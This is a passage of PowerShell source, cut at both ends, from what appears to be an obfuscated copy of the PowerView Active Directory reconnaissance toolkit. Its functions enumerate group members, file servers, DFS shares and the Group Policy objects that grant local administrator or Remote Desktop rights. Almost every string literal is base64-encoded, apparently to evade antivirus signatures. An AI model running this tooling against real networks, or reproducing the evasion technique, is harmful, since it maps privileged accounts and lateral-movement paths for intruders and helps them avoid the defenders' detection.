tem.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNuY3JlYXRlZA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcmFjY291bnRjb250cm9s"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0Z3VpZA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJpbWFyeWdyb3VwaWQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29mZg=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmFkcHdkY291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2hlbmNoYW5nZWQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyb2Y="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHdkbGFzdHNldA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWRzcGF0aA==")))))

                    $Members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIGZpbmQgR3JvdXA=")))
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG5hbWU9JEdyb3VwTmFtZSkkRmlsdGVyKQ==")))
                }
                elseif ($SID) {
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG9iamVjdFNJRD0kU0lEKSRGaWx0ZXIp")))
                }
                else {
                    
                    $SID = (Get-DomainSID -Domain $Domain) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LTUxMg==")))
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG9iamVjdFNJRD0kU0lEKSRGaWx0ZXIp")))
                }

                $GroupSearcher.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $GroupFoundName = $_.properties.name[0]
                        $Members = @()

                        if ($_.properties.member.Count -eq 0) {
                            $Finished = $False
                            $Bottom = 0
                            $Top = 0
                            while(!$Finished) {
                                $Top = $Bottom + 1499
                                $MemberRange=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyO3JhbmdlPSRCb3R0b20tJFRvcA==")))
                                $Bottom += 1500
                                $GroupSearcher.PropertiesToLoad.Clear()
                                [void]$GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE1lbWJlclJhbmdl"))))
                                try {
                                    $Result = $GroupSearcher.FindOne()
                                    if ($Result) {
                                        $RangedProperty = $_.Properties.PropertyNames -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyO3JhbmdlPSo=")))
                                        $Results = $_.Properties.item($RangedProperty)
                                        if ($Results.count -eq 0) {
                                            $Finished = $True
                                        }
                                        else {
                                            $Results | ForEach-Object {
                                                $Members += $_
                                            }
                                        }
                                    }
                                    else {
                                        $Finished = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $Finished = $True
                                }
                            }
                        } 
                        else {
                            $Members = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }

            $Members | Where-Object {$_} | ForEach-Object {
                
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($DomainController) {
                        $Result = [adsi](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLyREb21haW5Db250cm9sbGVyL3swfQ=="))) -f $_)
                    }
                    else {
                        $Result = [adsi](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovL3swfQ=="))) -f $_)
                    }
                    if($Result){
                        $Properties = $Result.Properties
                    }
                }

                if($Properties) {

                    if($Properties.samaccounttype -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODA1MzA2MzY4")))) {
                        $IsGroup = $True
                    }
                    else {
                        $IsGroup = $False
                    }

                    if ($FullData) {
                        $GroupMember = Convert-LDAPProperty -Properties $Properties
                    }
                    else {
                        $GroupMember = New-Object PSObject
                    }

                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $Domain
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupFoundName

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        
                        
                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        
                        $MemberName = $Properties.samaccountname[0]
                    } 
                    else {
                        
                        try {
                            $MemberName = Convert-SidToName $Properties.cn[0]
                        }
                        catch {
                            
                            $MemberName = $Properties.cn
                        }
                    }
                    
                    if($Properties.objectSid) {
                        $MemberSid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $MemberSid = $Null
                    }

                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $MemberDomain
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $MemberName
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyU2lk"))) $MemberSid
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRE4="))) $MemberDN
                    $GroupMember

                    
                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {
                        Get-NetGroupMember -FullData -Domain $MemberDomain -DomainController $DomainController -GroupName $MemberName -Recurse -PageSize $PageSize
                    }
                }

            }
        }
    }
}


function Get-NetFileServer {


    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String[]]
        $TargetUsers,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function SplitPath {
        
        param([String]$Path)

        if ($Path -and ($Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))).Count -ge 3)) {
            $Temp = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }

    Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {
            
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {
            
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function Get-DFSshare {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9ZlREZnMpKQ==")))

            try {
                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $RemoteNames = $Properties.remoteservername

                    $DFSshares += $RemoteNames | ForEach-Object {
                        try {
                            if ( $_.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))) ) {
                                New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=$Properties.name[0];([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]}
                            }
                        }
                        catch {
                            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgaW4gcGFyc2luZyBERlMgc2hhcmUgOiB7MH0="))) -f $_)
                        }
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LURGU3NoYXJlVjIgZXJyb3IgOiB7MH0="))) -f $_)
            }
            $DFSshares | Sort-Object -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
        }
    }

    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9bXNERlMtTGlua3YyKSk=")))
            $DFSSearcher.PropertiesToLoad.AddRange((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtbGlua3BhdGh2Mg=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNERlMtVGFyZ2V0TGlzdHYy")))))

            try {
                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $target_list = $Properties.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtdGFyZ2V0bGlzdHYy")))[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                    $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                        try {
                            $Target = $_.InnerText
                            if ( $Target.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))) ) {
                                $DFSroot = $Target.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[3]
                                $ShareName = $Properties.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtbGlua3BhdGh2Mg==")))[0]
                                New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JERGU3Jvb3QkU2hhcmVOYW1l")));([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$Target.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]}
                            }
                        }
                        catch {
                            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgaW4gcGFyc2luZyB0YXJnZXQgOiB7MH0="))) -f $_)
                        }
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LURGU3NoYXJlVjIgZXJyb3IgOiB7MH0="))) -f $_)
            }
            $DFSshares | Sort-Object -Unique -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
        }
    }

    $DFSshares = @()
    
    if ( ($Version -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxs")))) -or ($Version.endsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MQ=="))))) ) {
        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxs")))) -or ($Version.endsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Mg=="))))) ) {
        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    $DFSshares | Sort-Object -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
}








function Get-GptTmpl {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {
            
            $Parts = $GptTmplPath.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
            $FolderPath = $Parts[0..($Parts.length-2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))
            $FilePath = $Parts[-1]
            $RandDrive = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="))).ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW91bnRpbmcgcGF0aCAkR3B0VG1wbFBhdGggdXNpbmcgYSB0ZW1wIFBTRHJpdmUgYXQgJFJhbmREcml2ZQ==")))

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgbW91bnRpbmcgcGF0aCAkR3B0VG1wbFBhdGggOiB7MH0="))) -f $_)
                return $Null
            }

            
            $GptTmplPath = $RandDrive + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        } 
    }

    process {
        $SectionName = ''
        $SectionsTemp = @{}
        $SectionsFinal = @{}

        try {

            if(Test-Path $GptTmplPath) {

                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFyc2luZyAkR3B0VG1wbFBhdGg=")))

                Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                    if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFs=")))) {
                        
                        $SectionName = $_.trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W10=")))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))),''
                    }
                    elseif($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ==")))) {
                        $Parts = $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))
                        $PropertyName = $Parts[0].trim()
                        $PropertyValues = $Parts[1].trim()

                        if($PropertyValues -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) {
                            $PropertyValues = $PropertyValues.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))
                        }

                        if(!$SectionsTemp[$SectionName]) {
                            $SectionsTemp.Add($SectionName, @{})
                        }

                        
                        $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )
                    }
                }

                ForEach ($Section in $SectionsTemp.keys) {
                    
                    $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]
                }

                
                New-Object PSObject -Property $SectionsFinal
            }
        }
        catch {
            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcGFyc2luZyAkR3B0VG1wbFBhdGggOiB7MH0="))) -f $_)
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3ZpbmcgdGVtcCBQU0RyaXZlICRSYW5kRHJpdmU=")))
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}


function Get-GroupsXML {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {
            
            $Parts = $GroupsXMLPath.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
            $FolderPath = $Parts[0..($Parts.length-2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))
            $FilePath = $Parts[-1]
            $RandDrive = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="))).ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW91bnRpbmcgcGF0aCAkR3JvdXBzWE1MUGF0aCB1c2luZyBhIHRlbXAgUFNEcml2ZSBhdCAkUmFuZERyaXZl")))

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgbW91bnRpbmcgcGF0aCAkR3JvdXBzWE1MUGF0aCA6IHswfQ=="))) -f $_)
                return $Null
            }

            
            $GroupsXMLPath = $RandDrive + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        } 
    }

    process {

        
        if(Test-Path $GroupsXMLPath) {

            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath

            
            $GroupsXMLcontent | Select-Xml ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ly9Hcm91cA=="))) | Select-Object -ExpandProperty node | ForEach-Object {

                $Members = @()
                $MemberOf = @()

                
                $LocalSid = $_.Properties.GroupSid
                if(!$LocalSid) {
                    if($_.Properties.groupName -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
                        $LocalSid = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
                    }
                    elseif($_.Properties.groupName -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIERlc2t0b3A=")))) {
                        $LocalSid = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
                    }
                    else {
                        $LocalSid = $_.Properties.groupName
                    }
                }
                $MemberOf = @($LocalSid)

                $_.Properties.members | ForEach-Object {
                    
                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURE"))) } | ForEach-Object {

                        if($_.sid) {
                            $Members += $_.sid
                        }
                        else {
                            
                            $Members += $_.name
                        }
                    }
                }

                if ($Members -or $Memberof) {
                    
                    $Filters = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ=="))) = $_.LocalName;([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmFsdWU="))) = $_.name}
                        }
                    }

                    if($ResolveSids) {
                        $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}
                        $Members = $Members | ForEach-Object {Convert-SidToName $_}
                    }

                    if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                    if($Members -isnot [system.array]) {$Members = @($Members)}

                    $GPOProperties = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) = $GPODisplayName
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) = $GPOName
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) = $GroupsXMLPath
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVycw=="))) = $Filters
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyT2Y="))) = $Memberof
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVycw=="))) = $Members
                    }

                    New-Object -TypeName PSObject -Property $GPOProperties
                }
            }
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3ZpbmcgdGVtcCBQU0RyaXZlICRSYW5kRHJpdmU=")))
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}



function Get-NetGPO {

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200

    )

    begin {
        $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if ($GPOSearcher) {
            if($DisplayName) {
                $GPOSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpKGRpc3BsYXluYW1lPSREaXNwbGF5TmFtZSkp")))
            }
            else {
                $GPOSearcher.filter=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpKG5hbWU9JEdQT25hbWUpKQ==")))
            }

            $GPOSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}


function Get-NetGPOGroup {


    [CmdletBinding()]
    Param (
        [String]
        $GPOname = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $DisplayName,

        [Switch]
        $ResolveSids,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    
    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {

        $Memberof = $Null
        $Members = $Null
        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        $GPOPath = $_.gpcfilesyspath

        $ParseArgs =  @{
            'GptTmplPath' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEdQT1BhdGhcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5m")))
            'UsePSDrive' = $UsePSDrive
        }

        
        $Inf = Get-GptTmpl @ParseArgs

        if($Inf.GroupMembership) {

            $Memberof = $Inf.GroupMembership | Get-Member *Memberof | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) }
            $Members = $Inf.GroupMembership | Get-Member *Members | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) }

            
            if ($Members -or $Memberof) {

                
                if(!$Memberof) {
                    $Memberof = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
                }

                if($ResolveSids) {
                    $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}
                    $Members = $Members | ForEach-Object {Convert-SidToName $_}
                }

                if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                if($Members -isnot [system.array]) {$Members = @($Members)}

                $GPOProperties = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) = $GPODisplayName
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) = $GPOName
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) = $GPOPath
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVycw=="))) = $Null
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyT2Y="))) = $Memberof
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVycw=="))) = $Members
                }

                New-Object -TypeName PSObject -Property $GPOProperties
            }
        }

        $ParseArgs =  @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBzWE1McGF0aA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEdQT1BhdGhcTUFDSElORVxQcmVmZXJlbmNlc1xHcm91cHNcR3JvdXBzLnhtbA==")))
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZVNpZHM="))) = $ResolveSids
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
        }

        Get-GroupsXML @ParseArgs
    }
}


function Find-GPOLocation {


    [CmdletBinding()]
    Param (
        [String]
        $UserName,

        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $LocalGroup = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),
        
        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($UserName) {

        $User = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        $UserSid = $User.objectsid

        if(!$UserSid) {    
            Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlciAnJFVzZXJOYW1lJyBub3QgZm91bmQh")))
        }

        $TargetSid = $UserSid
        $ObjectSamAccountName = $User.samaccountname
        $ObjectDistName = $User.distinguishedname
    }
    elseif($GroupName) {

        $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
        $GroupSid = $Group.objectsid

        if(!$GroupSid) {    
            Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXAgJyRHcm91cE5hbWUnIG5vdCBmb3VuZCE=")))
        }

        $TargetSid = $GroupSid
        $ObjectSamAccountName = $Group.samaccountname
        $ObjectDistName = $Group.distinguishedname
    }
    else {
        throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LVVzZXJOYW1lIG9yIC1Hcm91cE5hbWUgbXVzdCBiZSBzcGVjaWZpZWQh")))
    }

    if($LocalGroup -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KkFkbWluKg==")))) {
        $LocalSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
    }
    elseif ( ($LocalGroup -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KlJEUCo=")))) -or ($LocalGroup -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KlJlbW90ZSo=")))) ) {
        $LocalSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
    }
    elseif ($LocalGroup -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUq")))) {
        $LocalSID = $LocalGroup
    }
    else {
